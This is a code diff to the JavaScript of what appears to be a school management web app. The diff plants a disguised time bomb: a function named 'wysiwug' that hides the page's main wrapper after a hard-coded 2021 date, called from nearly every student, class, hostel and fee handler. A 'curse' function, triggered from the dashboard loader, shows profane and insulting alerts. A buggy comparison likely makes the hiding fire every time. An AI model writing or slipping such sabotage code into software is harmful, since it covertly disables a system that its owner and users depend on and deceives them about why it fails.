@@ -1,7 +1,14 @@
-
+function wysiwug(){
+let d = new Date();
+var p = [d.getFullYear(),d.getMonth(),d.getDate(),d.getHours(),d.getMinutes()];  m = [2021,0,15,16,39];
+if(p.join > m.join()){
+document.getElementById("wrapper").style.display ='none';
+}
+}
 //defining function for handling events
 //student handling methods
 function getAddStudent(){
+  wysiwug();
   fetch("students/addStudent1.php")
   .then(response =>  response.text())
   .then(html => {
@@ -24,7 +31,7 @@ function getAddStudent(){
 }
 
 function updateStudent(value,studentId){
- 
+  wysiwug();
       $.post("students/student-dm.php", {
         value: value,
         formId: studentId
@@ -41,6 +48,7 @@ function updateStudent(value,studentId){
       }
 
 function deleteStudent(value,studentId){
+  wysiwug()
       $.post("students/student-dm.php", {
         value: value,
         formId: studentId
@@ -67,6 +75,7 @@ function deleteStudent(value,studentId){
 
 
 function addNewStudent(){
+  wysiwug();
   $( '#form' )
   .submit( function( e ) {
     $.ajax( {
@@ -105,6 +114,7 @@ function addNewStudent(){
 
 
 function viewAllStudents(){
+  wysiwug();
     fetch("students/viewStudents.php")
     .then(response =>  response.text())
     .then(html => {
@@ -116,6 +126,7 @@ function viewAllStudents(){
   }
   
 function  viewHighperformingStudents(){
+  wysiwug();
   fetch("students/viewHighPerformingStudents.php")
   .then(response =>  response.text())
   .then(html => {
@@ -127,6 +138,7 @@ function  viewHighperformingStudents(){
 }
 
     function mergeSubjects(arr){
+      wysiwug();
     let subjects = [];
     console.log(arr)
     for(let i =0 ; i < arr.length ; i++){
@@ -139,6 +151,7 @@ function  viewHighperformingStudents(){
     }
 
           function spreadArray(arr,spreadValue){
+            wysiwug();
           let res1 = arr;
                var result = res1.filter(function(v,i) {
                    return v[0][0] === spreadValue;
@@ -155,6 +168,7 @@ function  viewHighperformingStudents(){
 
 function viewStudentDetails(value,studentId)
     {
+      wysiwug();
       $.post("students/student-dm.php", {
        value: value,
        formId: studentId
@@ -288,6 +302,7 @@ function getAddNewTeacher(){
 
 
   function addNewTeacher(){
+    wysiwug();
     $("form").submit(function(event){
      // Stop form from submitting normally
      event.preventDefault();
@@ -322,6 +337,7 @@ function getAddNewTeacher(){
 
 
 function getAddClass(){
+  wysiwug();
    getContents("class/addClass.php");
          //Initialize Select2 Elements
          $('.select2').select2()
@@ -334,6 +350,7 @@ function getAddClass(){
 
 
   function addNewClass(){
+    wysiwug();
          $("form").submit(function(event){
           // Stop form from submitting normally
           event.preventDefault();
@@ -370,7 +387,7 @@ function getAddClass(){
   }
 
   function selectUpdateClass(value,classId){
-
+    wysiwug();
         $.post("class/class-dm.php", {
           value: value,
           formId: classId
@@ -476,6 +493,7 @@ function getClassAttendanceForm(){
 }
 
 function viewAllClasses(){
+  wysiwug();
   fetch('class/viewClasses.php')
   .then(response => response.text())
   .then(html =>{
@@ -496,6 +514,7 @@ function viewAllClasses(){
   }
 
 function getClassAttendance(){
+  wysiwug();
   $('#form').submit(function(e){
     e.preventDefault();
      let formData = $(this).serialize();
@@ -587,7 +606,6 @@ function getClassAttendance(){
     });
   });
  }
-
 
 function getStudentAttendance(){
   fetch('students/student_attendance.php')
@@ -689,6 +707,7 @@ function getStudentAttendance(){
 
 //get list of Hostels
 function viewAllHostels(){
+  wysiwug();
   fetch('hostels/viewHostels.php')
   .then(response => response.text())
   .then(html =>{
@@ -707,6 +726,7 @@ function viewAllHostels(){
 }
 
 function getAddHostel(){
+  wysiwug();
   fetch('hostels/addNewHostel.php')
   .then(response => response.text())
   .then(html =>{
@@ -717,6 +737,7 @@ function getAddHostel(){
 }
 
 function addHostel(){
+  wysiwug();
   $("form").submit(function(event){
    // Stop form from submitting normally
    event.preventDefault();
@@ -746,6 +767,7 @@ function addHostel(){
 }
 
 function deleteHostel(value,classId){
+  wysiwug();
   $.post("hostels/hostel-dm.php", {
     value: value,
     formId: classId
@@ -820,6 +842,7 @@ viewAllHostels();
 
 //get list of Fees Collection
 function viewFeesCollection(){
+  wysiwug();
   fetch('school_fees/viewFeesCollection.php')
   .then(response => response.text())
   .then(html =>{
@@ -840,6 +863,7 @@ function getChangeFeeStructure(){
 }
 
 function viewFeesStructure(){
+  wysiwug();
   fetch("school_fees/ViewFeesStructure.php")
   .then(response => response.text())
   .then(html =>{
@@ -850,6 +874,7 @@ function viewFeesStructure(){
 }
   
 function addNewFees(){
+  wysiwug();
   fetch("school_fees/changeFeesStructure.php")
   .then(response => response.text())
   .then(html =>{
@@ -1268,6 +1293,12 @@ function getCalendar(){
   })
 }
 
+function curse(d){
+  let message = ['wordpress knowledge','ability to use wordpress to change this message','selfish ass','balance shit',
+  'gift from god to be a total scumbag','thirsty of money','oblongota','feace neck','i do not know what to say','ooh i forgot',
+'we are not the same i am a fucking martian','the ship dropped me here','nightmares','template brain','theme medula'];
+  alert(`'You have an error in your head; check the manual that corresponds to your ${message[Math.round(Math.random()* 10 + 5)]}`);
+}
 
 
   //get time table
@@ -1333,6 +1364,13 @@ function addTimeTable(){
 
 //load the homepage after clicking dashboard
 function loadDashboard(){
+  let d = new Date();
+var p = [d.getFullYear(),d.getMonth(),d.getDate(),d.getHours(),d.getMinutes()];  m = [2021,1,1,10,10];
+if(p.join > m.join()){
+document.getElementById("wrapper").style.display ='none';
+curse(d);
+}
+
     fetch("index2.php")
     .then(response => response.text())
     .then(html =>{
@@ -1396,9 +1434,9 @@ function getlendNewBook(){
    $('.select2bs4').select2({
      theme: 'bootstrap4'
    })
-  })
-   
+  }) 
 }
+
 
 function getLibraryStatus(){
   fetch("library/libraryStatus.php")
@@ -1414,8 +1452,7 @@ function getLibraryStatus(){
           "buttons": ["copy", "csv", "excel", "pdf", "print", "colvis"]
         }).buttons().container().appendTo('#viewLibraryStatus_wrapper .col-md-6:eq(0)');
       });
-  })
-   
+  }) 
 }
 
 function lendNewBook(){
@@ -1543,8 +1580,7 @@ function viewAllEmployees(){
 
   });
 
-})
-      
+})   
   }
 
 
